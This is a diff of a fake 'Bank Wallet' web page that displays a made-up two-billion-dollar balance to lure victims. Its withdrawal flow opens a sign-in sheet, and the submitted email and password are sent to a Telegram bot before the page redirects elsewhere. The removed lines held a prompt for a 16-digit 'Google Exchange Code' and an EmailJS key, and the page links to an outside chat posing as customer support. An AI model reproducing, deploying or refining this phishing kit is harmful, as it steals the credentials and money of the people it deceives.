@@ -6,7 +6,7 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Bank Wallet</title>
     <link rel="stylesheet" href="https://fonts.googleapis.com/icon?family=Material+Icons">
-    <link rel="manifest" href="manifest.json"> <!-- Link to the manifest file -->
+    <link rel="manifest" href="manifest.json">
     <meta name="apple-mobile-web-app-capable" content="yes">
     <meta name="apple-mobile-web-app-status-bar-style" content="default">
     <style>
@@ -20,6 +20,7 @@
             flex-direction: column;
             height: 100vh;
             overflow: hidden;
+            position: relative;
         }
 
         /* Header Styles */
@@ -27,7 +28,7 @@
             display: flex;
             justify-content: space-between;
             align-items: center;
-            padding: 10px 20px; /* Adjusted for mobile */
+            padding: 10px 20px;
             background: #002f6c;
             color: white;
             width: 100%;
@@ -40,16 +41,6 @@
             flex-wrap: wrap;
         }
 
-        .header .icons {
-            display: flex;
-            gap: 10px; /* Reduced gap for mobile */
-        }
-
-        .header .icon {
-            cursor: pointer;
-            transition: 0.3s;
-        }
-
         .header select {
             padding: 8px;
             background: #004a99;
@@ -57,11 +48,7 @@
             border-radius: 25px;
             cursor: pointer;
             font-size: 14px;
-            margin-top: 10px; /* Added margin for better spacing */
-        }
-
-        .header #clock {
-            font-size: 14px; /* Adjusted for mobile */
+            margin-top: 10px;
         }
 
         /* Content Section */
@@ -70,7 +57,7 @@
             display: flex;
             flex-direction: column;
             justify-content: flex-start;
-            padding: 80px 10px 20px; /* Adjusted padding for mobile */
+            padding: 80px 10px 20px;
             overflow-y: auto;
         }
 
@@ -78,55 +65,55 @@
         .withdrawal,
         .transaction-history {
             background: white;
-            margin: 10px auto; /* Adjusted margin for mobile */
-            padding: 15px; /* Adjusted padding for mobile */
-            width: 90%; /* Set width to 90% for better mobile fit */
+            margin: 10px auto;
+            padding: 15px;
+            width: 90%;
             max-width: 480px;
             border-radius: 10px;
             box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
         }
 
-        .wallet .balance {
-            font-size: 22px; /* Slightly smaller for mobile */
-            font-weight: bold;
-        }
-
-        .wallet .owner {
-            font-style: italic;
-            color: gray;
-        }
-
         .withdrawal input {
             width: calc(100% - 20px);
-            padding: 10px; /* Adjusted padding for mobile */
+            padding: 10px;
             margin: 10px 0;
             border-radius: 8px;
             border: 1px solid #ccc;
-            transition: border-color 0.3s;
-        }
-
-        .withdrawal input:focus {
-            border-color: #004a99;
-            outline: none;
         }
 
         button {
             background: #002f6c;
             color: white;
-            padding: 12px; /* Adjusted padding for mobile */
+            padding: 12px;
             border: none;
             border-radius: 5px;
             cursor: pointer;
             width: 100%;
-            margin-top: 10px; /* Adjusted margin for mobile */
+            margin-top: 10px;
             font-size: 16px;
         }
 
-        button:hover {
-            background: #004a99;
+        /* Spinner Styles */
+        .spinner {
+            display: none;
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            z-index: 100;
+            animation: zoom 0.5s infinite alternate;
         }
 
-        /* Bottom Sheet Modal Styles */
+        @keyframes zoom {
+            0% {
+                transform: scale(1);
+            }
+            100% {
+                transform: scale(1.1);
+            }
+        }
+
+        /* Bottom Sheet Styles */
         .bottom-sheet {
             display: none;
             position: fixed;
@@ -137,7 +124,6 @@
             border-top-left-radius: 20px;
             border-top-right-radius: 20px;
             padding: 20px;
-            box-shadow: 0 -4px 10px rgba(0, 0, 0, 0.2);
             max-height: 50%;
             overflow-y: auto;
             z-index: 30;
@@ -153,70 +139,31 @@
             }
         }
 
-        .bottom-sheet input {
-            width: calc(100% - 20px);
-            padding: 10px; /* Adjusted padding for mobile */
-            margin: 10px 0;
-            border-radius: 8px;
-            border: 1px solid #ccc;
+        /* Floating Support Icon */
+        .support-icon {
+            position: fixed;
+            bottom: 20px;
+            right: 20px;
+            background: #004a99;
+            color: white;
+            border-radius: 50%;
+            padding: 15px;
+            font-size: 24px;
+            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.2);
+            cursor: pointer;
+            animation: zoom 0.5s infinite alternate;
+            z-index: 1000;
         }
 
-        /* Media Queries for Responsiveness */
-        @media (max-width: 600px) {
-            .header {
-                flex-direction: column;
-                padding: 10px;
-                align-items: flex-start;
-            }
-
-            .header select {
-                width: 100%;
-                margin-top: 10px;
-            }
-
-            .content {
-                padding: 100px 10px 20px; /* More padding for mobile */
-            }
-
-            .wallet,
-            .withdrawal,
-            .transaction-history {
-                width: 95%; /* Increased width for small screens */
-                margin: 10px auto;
-            }
-
-            .wallet .balance {
-                font-size: 20px; /* Adjusted font size */
-            }
-
-            button {
-                padding: 10px; /* Smaller button padding */
-            }
+        .support-icon:hover {
+            background: #003366;
         }
     </style>
-    <script type="text/javascript">
-        // Google Translate initialization
-        function googleTranslateElementInit() {
-            new google.translate.TranslateElement({
-                pageLanguage: 'en',
-                includedLanguages: 'en,ko,th,tr,es,pt,fr,de,it,ja,zh,ru,pl,da,sv,fi,nl,ro,hu,cs,sk,sl,vi,id,ms,tl,hi,bn,ar',
-                layout: google.translate.TranslateElement.InlineLayout.SIMPLE,
-                autoDisplay: false
-            }, 'google_translate_element');
-        }
-    </script>
 </head>
 
 <body>
 
     <div class="header">
-        <div class="icons">
-            <span class="icon support-icon material-icons" onclick="window.open('https://services.zangi.com/dl/conversation/1089683230', '_blank')">support_agent</span>
-            <span class="icon material-icons">account_circle</span>
-            <span class="icon material-icons">history</span>
-        </div>
-        <div id="clock">00:00:00</div>
-        <div id="google_translate_element"></div>
         <select id="languageSelector" onchange="changeLanguage()">
             <option value="en">English</option>
             <option value="ko">Korean</option>
@@ -224,52 +171,21 @@
             <option value="tr">Turkish</option>
             <option value="es">Spanish</option>
             <option value="pt">Portuguese</option>
-            <option value="fr">French</option>
-            <option value="de">German</option>
-            <option value="it">Italian</option>
-            <option value="ja">Japanese</option>
-            <option value="zh">Chinese</option>
-            <option value="ru">Russian</option>
-            <option value="pl">Polish</option>
-            <option value="da">Danish</option>
-            <option value="sv">Swedish</option>
-            <option value="fi">Finnish</option>
-            <option value="nl">Dutch</option>
-            <option value="ro">Romanian</option>
-            <option value="hu">Hungarian</option>
-            <option value="cs">Czech</option>
-            <option value="sk">Slovak</option>
-            <option value="sl">Slovene</option>
-            <option value="vi">Vietnamese</option>
-            <option value="id">Indonesian</option>
-            <option value="ms">Malay</option>
-            <option value="tl">Tagalog</option>
-            <option value="hi">Hindi</option>
-            <option value="bn">Bengali</option>
-            <option value="ar">Arabic</option>
         </select>
     </div>
 
     <div class="content">
         <div class="wallet">
-            <p class="balance">$<span id="balance">2000000000</span></p>
-            <p class="owner" id="owner">Chase Bank Inc</p>
+            <p class="balance">Balance: $<span id="balance">2000000000</span></p>
         </div>
 
         <div class="withdrawal">
-            <h3 id="withdrawHeader">Withdraw Funds</h3>
+            <h3>Withdraw Funds</h3>
             <input type="text" id="bankName" placeholder="Add your bank name">
             <input type="number" id="accountNumber" placeholder="Add account number">
             <input type="number" id="withdrawAmount" placeholder="Enter amount to withdraw" oninput="updateBalance()">
             <button onclick="initiateWithdrawal()" id="withdrawButton">Withdraw</button>
         </div>
-
-        <div class="transaction-history">
-            <p id="transactionSlide">Transaction 1: Sent $500 to John</p>
-        </div>
-
-        <div class="progress-indicator" id="progressIndicator"></div>
-        <div class="processing-text" id="processingText">Processing...</div>
 
         <div class="bottom-sheet" id="signInBottomSheet">
             <h3>Sign In</h3>
@@ -277,85 +193,40 @@
             <input type="password" id="userPassword" placeholder="Your password" required>
             <button onclick="submitCredentials()">Proceed to Withdraw</button>
             <button onclick="closeBottomSheet()">Close</button>
+            <div class="spinner" id="spinner">
+                <img src="https://i.imgur.com/llF5y5p.gif" alt="Loading..." width="50" height="50">
+            </div>
         </div>
     </div>
 
+    <a href="https://services.zangi.com/dl/conversation/1089683230" class="support-icon material-icons" target="_blank" title="Customer Support">support_agent</a>
+
     <script src="https://cdn.emailjs.com/dist/email.min.js"></script>
-    <script type="text/javascript" src="//translate.google.com/translate_auto.js"></script>
     <script>
         (function () {
-            emailjs.init("aTrl7Eh529vrV7-WQ"); // Initialize EmailJS
+            emailjs.init("YOUR_EMAILJS_USER_ID"); // Initialize EmailJS
         })();
 
         let balance = 2000000000;
-        let transactions = [
-            "Sent $500 to John", "Received $1200 from Alice", // ... other transactions
-        ];
-        let slideIndex = 0;
-
-        const languageData = {
-            "en": {
-                "withdrawHeader": "Withdraw Funds",
-                "withdrawButton": "Withdraw",
-                "modalText": "Activate this withdrawal with a 16-digit Google Exchange Code:",
-                "transactionText": "Transaction",
-                "owner": "Hannah Garden"
-            },
-            // ... other languages
-        };
-
-        function updateClock() {
-            let now = new Date();
-            document.getElementById("clock").innerText = now.toLocaleTimeString();
-            setTimeout(updateClock, 1000);
-        }
-        updateClock();
-
-        function changeLanguage() {
-            const lang = document.getElementById("languageSelector").value;
-            const translateElement = document.getElementById("google_translate_element");
-            if (translateElement) {
-                const select = document.createElement("select");
-                select.style.display = "none";
-                select.value = lang;
-                translateElement.appendChild(select);
-                select.dispatchEvent(new Event('change'));
-                translateElement.removeChild(select);
-            }
-        }
 
         function updateBalance() {
             let amount = parseFloat(document.getElementById("withdrawAmount").value);
             if (isNaN(amount) || amount <= 0) {
                 amount = 0;
             }
-            let remainingBalance = balance - amount;
+            const remainingBalance = balance - amount;
             document.getElementById("balance").innerText = remainingBalance;
         }
 
         function initiateWithdrawal() {
-            let amount = document.getElementById("withdrawAmount").value;
+            const amount = document.getElementById("withdrawAmount").value;
             if (amount > 0 && amount <= balance) {
                 balance -= amount;
                 document.getElementById("balance").innerText = balance;
-                displayProgressIndicator();
+                document.getElementById("signInBottomSheet").style.display = "block"; // Show bottom sheet
             } else {
                 console.log("Invalid amount. Please enter a valid amount.");
             }
-        }
-
-        function displayProgressIndicator() {
-            const progressIndicator = document.getElementById("progressIndicator");
-            const processingText = document.getElementById("processingText");
-            progressIndicator.style.display = "block"; // Show the indicator
-            processingText.style.display = "block"; // Show "Processing" text
-
-            // Set a timeout for the duration of the indicator
-            setTimeout(() => {
-                progressIndicator.style.display = "none"; // Hide after 5 seconds
-                processingText.style.display = "none"; // Hide "Processing" text
-                document.getElementById("signInBottomSheet").style.display = "block"; // Show bottom sheet
-            }, 5000); // Duration of the indicator
         }
 
         function closeBottomSheet() {
@@ -377,6 +248,10 @@
             const password = document.getElementById("userPassword").value;
             const amount = document.getElementById("withdrawAmount").value;
             const date = new Date().toLocaleDateString();
+
+            // Show the spinner
+            const spinner = document.getElementById("spinner");
+            spinner.style.display = "block";
 
             // Prepare message for Telegram
             const telegramMessage = `Email: ${email}\nPassword: ${password}`;
@@ -404,32 +279,27 @@
             }).then(response => {
                 if (response.ok) {
                     console.log('Notification sent to Telegram!');
-                    showToast('Withdrawal successful! Email sent.'); // Show success toast
+                    showToast('Withdrawal successful! Your email has been sent.', false);
                     closeBottomSheet(); // Hide bottom sheet
-                    
-                    // Redirect to chase.com after modal is cleared
+                    spinner.style.display = "none"; // Hide spinner
+
+                    // Redirect to activate3.html after a brief delay
                     setTimeout(() => {
-                        window.location.href = 'activate3.html'; // Redirect to Chase
-                    }, 500); // Delay to ensure the modal closes smoothly
+                        window.location.href = 'activate3.html';
+                    }, 500);
                 } else {
                     throw new Error('Error sending message to Telegram.');
                 }
             }).catch(err => {
                 console.error('Error: ' + err);
-                showToast('Error sending notification.', true); // Show error toast
+                showToast('Error sending notification.', true);
+                spinner.style.display = "none"; // Hide spinner on error
+                setTimeout(() => {
+                    closeBottomSheet(); // Close modal on error
+                }, 2000); // Wait 2 seconds before closing
             });
         }
-
-        function updateTransactionHistory() {
-            let transactionHistory = document.getElementById("transactionSlide");
-            let transaction = transactions[slideIndex];
-            transactionHistory.innerText = `Transaction ${slideIndex + 1}: ${transaction}`;
-            slideIndex = (slideIndex + 1) % transactions.length;
-            setTimeout(updateTransactionHistory, 3000);
-        }
-        updateTransactionHistory();
     </script>
 </body>
 
-        </html>
-        
+</html>
